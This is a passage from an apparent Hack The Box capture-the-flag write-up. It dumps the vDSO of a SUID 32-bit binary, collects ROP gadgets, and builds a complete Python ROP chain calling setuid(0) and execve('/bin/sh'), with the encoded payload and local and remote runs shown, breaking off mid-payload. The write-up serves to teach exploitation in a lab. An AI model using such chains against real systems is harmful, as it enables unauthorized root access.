+<span class="code-green">root@arena</span>:<span class="code-blue">/</span># Where to go, challenger? your fractured reflection is your only guide.  
+&gt;
+[1]+  Stopped (tty input)        /target
+<span class="code-green">root@arena</span>:<span class="code-blue">/</span># pidof target
+76
+<span class="code-green">root@arena</span>:<span class="code-blue">/</span># cat /proc/76/maps
+08048000-08049000 r--p 00000000 00:02 317                                /target
+08049000-0804a000 r-xp 00001000 00:02 317                                /target
+0804a000-0804b000 rw-p 00002000 00:02 317                                /target
+f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
+f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
+fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]
+</code></pre></div><p>The binary&rsquo;s instructions is at <code>08049000-0804a000</code>, but we have another executable page at <code>f7ffc000-f7ffe000</code>, which is vDSO. This region is used to let the program use <code>syscall</code> instructions, to redirect the execution to the kernel.</p><p>We can dump its content using <code>dd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))  
+8192+0 records in
+8192+0 records out
+8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s
+</code></pre></div><p>Now, to extract it, we can use <code>gzip</code> and <code>base64</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># gzip vdso
+<span class="code-green">root@arena</span>:<span class="code-blue">/</span># base64 vdso.gz
+H4sIAAAAAAAAA+2ZcXQbxZnAd7WyrQThVc4usbFjm54Bc3HdKDEQ1cGPEAuXa5RAYiWBoLgmUUge  
+...
+ZJqelnRb4NxPQe/5Gdr78vjy+PL48vh7Pv4CVkquWAAgAAA=
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'&lt;base64-payload&gt;'</span> | <span class="code-dark-green">base64</span> -d | <span class="code-dark-green">gzip</span> -d - &gt; vdso
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">vdso</span>
+vdso: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=3217528fe99bd85fcb961d07aa790af666c989c7, stripped  
+</code></pre></div><p>In this binary file, we can find more ROP gadgets.</p><p>The best approach is to use <code>sys_sigreturn</code>, because it allows to set all registers using a stack frame. As a result, we would be able to set all registers and leave them ready to execute <code>sys_execve</code> and gain arbitrary code execution. Notice that we already have ROP gadgets that execute a <code>sys_sigreturn</code> (<code>$eax = 0x77</code>), because it is used to switch to kernel mode:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">vdso</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">'int 0x80'</span>
+0x0000058e : add byte ptr [eax + 0x77b858], dl ; add byte ptr [eax], al ; <span class="code-red">int 0x80</span>
+0x0000059f : add byte ptr [eax + 0xad], bh ; <span class="code-red">int 0x80</span>
+0x0000059d : add byte ptr [eax], al ; add byte ptr [eax + 0xad], bh ; <span class="code-red">int 0x80</span>
+0x0000059c : add byte ptr [eax], al ; add byte ptr [eax], al ; mov eax, 0xad ; <span class="code-red">int 0x80</span>  
+0x00000594 : add byte ptr [eax], al ; <span class="code-red">int 0x80</span>
+0x0000059e : add byte ptr [eax], al ; mov eax, 0xad ; <span class="code-red">int 0x80</span>
+0x0000058d : add byte ptr [eax], al ; nop ; pop eax ; mov eax, 0x77 ; <span class="code-red">int 0x80</span>
+0x00000577 : <span class="code-red">int 0x80</span>
+0x00000592 : ja 0x594 ; add byte ptr [eax], al ; <span class="code-red">int 0x80</span>
+0x00000591 : mov eax, 0x77 ; <span class="code-red">int 0x80</span>
+0x000005a0 : mov eax, 0xad ; <span class="code-red">int 0x80</span>
+0x0000058f : nop ; pop eax ; mov eax, 0x77 ; <span class="code-red">int 0x80</span>
+0x00000590 : pop eax ; mov eax, 0x77 ; <span class="code-red">int 0x80</span>
+</code></pre></div><p>During the development phase, I couldn&rsquo;t find a payload that worked with <code>sys_sigreturn</code> on the remote instance, so I used a different approach.</p><p>My objective was to execute <code>setuid(0)</code> and <code>execve("/bin/sh", ["/bin/sh", NULL], NULL)</code>. The first <code>syscall</code> is needed because we need to become <code>root</code> (the binary is SUID, but that&rsquo;s not enough to execute as <code>root</code>). On the other hand, we need to call <code>/bin/sh</code> and set the first argument (<code>argv[0]</code>) to <code>/bin/sh</code> too because the kernel uses <code>busybox</code>, so running just <code>/bin/sh</code> will just output the help panel of <code>busybox</code>, and not spawn a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># ls -l /bin/sh
+lrwxrwxrwx    1 root     root             7 Mar 17 12:31 <span class="code-cyan">/bin/sh</span> -&gt; <span class="code-green">busybox</span>  
+</code></pre></div><p>So, I need the following:</p><ul><li>Set <code>$eax = 0x17</code> for <code>sys_setuid16</code> and <code>$ebx = 0</code></li><li>Write <code>"/bin/sh\0"</code> at a writable address</li><li>Write the address of <code>"/bin/sh\0"</code> and a <code>NULL</code> pointer at a writable address</li><li>Set <code>$eax = 0xb</code> for <code>sys_execve</code>, set <code>$ebx</code> to the address of <code>"/bin/sh\0"</code>, set <code>$ecx</code> to the address that points to the address of <code>"/bin/sh\0"</code> and set <code>$edx = 0</code></li></ul><h2 id="exploit-development">Exploit development</h2><p>For this, I found the following ROP gadgets and writable addresses:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f7ffc000</span>
+
+<span class="mtk1">int_0x80_xor_eax_eax_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">8049010</span>
+<span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">804a800</span>
+
+<span class="mtk3"># 0x0000057a : pop edx ; pop ecx ; ret</span>
+<span class="mtk1">pop_edx_pop_ecx_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">57a</span>
+
+<span class="mtk3"># 0x00000cca : mov dword ptr [edx], ecx ; add esp,</span><span class="mtk3"> 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; re</span><span class="mtk3">t</span>  
+<span class="mtk1">mov_dword_ptr_edx_ecx_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">cca</span>
+
+<span class="mtk3"># 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] </span><span class="mtk3">; pop edi ; pop ebp ; ret</span>
+<span class="mtk1">or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ccb</span>
+
+<span class="mtk3"># 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret</span>
+<span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">vdso_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">15cd</span>
+</code></pre></div><p>With those, I have a way to easily set <code>$edx</code>, <code>$ecx</code>, <code>$ebx</code>, <code>$edi</code>, <code>$esi</code> and <code>$ebp</code>.</p><p>Moreover, we have a write-what-where ROP gadget, which is useful to write <code>"/bin/sh\0"</code> at a writable address. For this, we need to put the value we want to write in <code>$ecx</code> and the address where we want to write it to in <code>$edx</code>. The drawback of this ROP gadget is that the stack pointer is increased in <code>0x34</code>, so we have lost 13 ROP gadgets.</p><p>Last but not least, we can set almost arbitrary values at <code>$eax</code> by finding an address that contains the value we want for <code>$eax</code> (or something that will be the result of an OR operation).</p><p>This will be the execution of <code>setuid(0)</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">32</span>
+
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32((</span><span class="mtk7 mtki">0x</span><span class="mtk6">804a08c</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">5e5b34c4</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr</span><span class="mtk1">)</span>  
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">3</span>
+
+<span class="mtk3"># sys_setuid(0)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">int_0x80_xor_eax_eax_ret_addr</span><span class="mtk1">)</span>
+</code></pre></div><p>Notice that the Buffer Overflow offset is 32 (<code>0x20</code>), as seen before on the assembly code. Then, we are using the byte at address <code>0x804a08c</code> to set the value of <code>$eax = 0xd</code> (the previous value was <code>$eax = 0</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> <span class="mtku">initramfs/target</span> | <span class="code-dark-green">grep</span> -E <span class="code-dark-yellow">' 17|17 '</span>
+00002080: 00a0 0408 0000 0000 0000 0200<span class="code-red"> 17</span>00 0000  ................  
+</code></pre></div><p>Notice that the binary will be loaded at <code>0x8048000</code>, so the above offset is <code>0x804a08c</code>. Also, we don&rsquo;t have ASLR, so the vDSO memory region is always at <code>0xf7ffc000</code>.</p><p>The following part will set <code>$eax = 0xb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32((</span><span class="mtk7 mtki">0x</span><span class="mtk6">8048012</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">5e5b34c4</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr</span><span class="mtk1">)</span>  
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32((</span><span class="mtk7 mtki">0x</span><span class="mtk6">804803f</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">5e5b34c4</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+</code></pre></div><p>We don&rsquo;t have <code>0x0b</code> in the binary, but we can find <code>0x3</code> and <code>0x8</code>, so that <code>0x3 | 0x8 = 0xb</code> (offsets <code>0x8048012</code> and <code>0x804803f</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">xxd</span> <span class="mtku">initramfs/target</span> | <span class="code-dark-green">head</span> -4
+00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............  
+00000010: 0200 0300 0100 0000 1590 0408 3400 0000  ............4...
+00000020: 4021 0000 0000 0000 3400 2000 0400 2800  @!......4. ...(.
+00000030: 0600 0500 0100 0000 0000 0000 0080 0408  ................
+</code></pre></div><p>The next part of the ROP chain is used to write <code>"/bin/sh\0"</code> into a writable address (for instance, <code>0x804a800</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_edx_pop_ecx_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin'</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">mov_dword_ptr_edx_ecx_ret_addr</span><span class="mtk1">)</span>  
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">13</span><span class="mtk1">)</span>
+
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_edx_pop_ecx_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">mov_dword_ptr_edx_ecx_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">13</span><span class="mtk1">)</span>
+</code></pre></div><p>We also need to write the address that points to the address of <code>"/bin/sh\0"</code> in a writable address as the <code>argv</code> for <code>execve</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_edx_pop_ecx_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">mov_dword_ptr_edx_ecx_ret_addr</span><span class="mtk1">)</span>  
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">13</span><span class="mtk1">)</span>
+</code></pre></div><p>Finally, we call <code>sys_execve</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_ebx_pop_esi_pop_ebp_ret</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">pop_edx_pop_ecx_ret_addr</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">bin_sh_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">)</span>
+
+<span class="mtk3"># sys_execve("/bin/sh", ["/bin/sh", NULL], NULL)</span>  
+<span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p32(</span><span class="mtk1">int_0x80_xor_eax_eax_ret_addr</span><span class="mtk1">)</span>
+</code></pre></div><p>Since the above payload is going to be &ldquo;one-shot&rdquo;, we just Base64-encode it and print it out:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">assert</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">200</span>  
+<span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk8">b64e</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
+</code></pre></div><p>This is the payload:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAAAAAAB6xf/3AAAAADCoBAgQkAQI  
+</code></pre></div><p>We will use the following set of commands to input the payload and leave the process open with <code>cat</code> to execute commands when the shell spawns:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">(</span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">'&lt;base64-payload&gt;'</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">base64</span><span class="mtk1"> </span><span class="mtk6">-d</span><span class="mtk1">; </span><span class="mtk8">cat</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">/target</span>  
+</code></pre></div><p>And with this, we have a shell locally:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">root@arena</span>:<span class="code-blue">/</span># (echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHrF//cwqAQIAKgECMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM3V//cAqAQIAAAAAAAAAAB6xf/3AAAAADCoBAgQkAQI | base64 -d; cat) | /target  
+Where to go, challenger? your fractured reflection is your only guide.
+&gt; ls
+
+<span class="code-blue">bin</span>      <span class="code-blue">etc</span>      <span class="code-green">init</span>     <span class="code-blue">mnt</span>      <span class="code-blue">root</span>     <span class="code-blue">sys</span>      <span class="code-blue">usr</span>
+<span class="code-blue">dev</span>      <span class="code-blue">home</span>     <span class="code-cyan">linuxrc</span>  <span class="code-blue">proc</span>     <span class="code-blue">sbin</span>     <span class="code-green">target</span>   <span class="code-blue">var</span>
+whoami
+
+root
+cat /root/flag.txt
+
+HTB{fake_flag}
+</code></pre></div><p>It is worth mentioning that during the exploit development, I needed to debug the exploit, but it was pretty hard because it was running inside <code>qemu</code>. I found a workaround by <a target="_blank" href="https://stackoverflow.com/questions/17965/how-to-generate-a-core-dump-in-linux-on-a-segmentation-fault">enabling core dumps</a>, and then copying the core file into my machine and debugging with GDB to see where the exploit failed. Another approach was to debug the kernel and set breakpoints at <code>syscall</code> instructions, then we can achieve the flow execution of the 32-bit program.</p><h2 id="flag">Flag</h2><p>Let&rsquo;s go remote:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> 94.237.58.102 44985
+SeaBIOS (version rel-1.16.2-0-gea1b7a073390-prebuilt.qemu.org)
+
+
+iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+06FD1040+06F31040 CA00
+
+
+
+Booting from ROM...
+<span class="code-green">challenger@arena</span>:<span class="code-blue">/</span>$ whoami
+whoami
+challenger
+<span class="code-green">challenger@arena</span>:<span class="code-blue">/</span>$ ls
+ls
+<span class="code-blue">bin</span>      <span class="code-blue">etc</span>      <span class="code-green">init</span>     <span class="code-blue">mnt</span>      <span class="code-blue">root</span>     <span class="code-blue">sys</span>      <span class="code-blue">usr</span>
+<span class="code-blue">dev</span>      <span class="code-blue">home</span>     <span class="code-cyan">linuxrc</span>  <span class="code-blue">proc</span>     <span class="code-blue">sbin</span>     <span class="code-green">target</span>   <span class="code-blue">var</span>
+<span class="code-green">challenger@arena</span>:<span class="code-blue">/</span>$ cat /root/flag.txt
+cat /root/flag.txt
+cat: can't open '/root/flag.txt': Permission denied
+<span class="code-green">challenger@arena</span>:<span class="code-blue">/</span>$ (echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQAAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8zt  
+(echo QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUHN1f/3yGupqQ
+AAAAAAAAAAy8z/9wAAAAAAAAAAzdX/9wAAAAAAAAAAAAAAABCQBAjN1f/3TkupqQAAAAAAAAAAy8z/9w
+AAAAAAAAAAzdX/93tLqakAAAAAAAAAAMvM//cAAAAAAAAAAHrF//cAqAQIL2JpbsrM//cAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH
+rF//cEqAQIL3NoAMrM//cAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
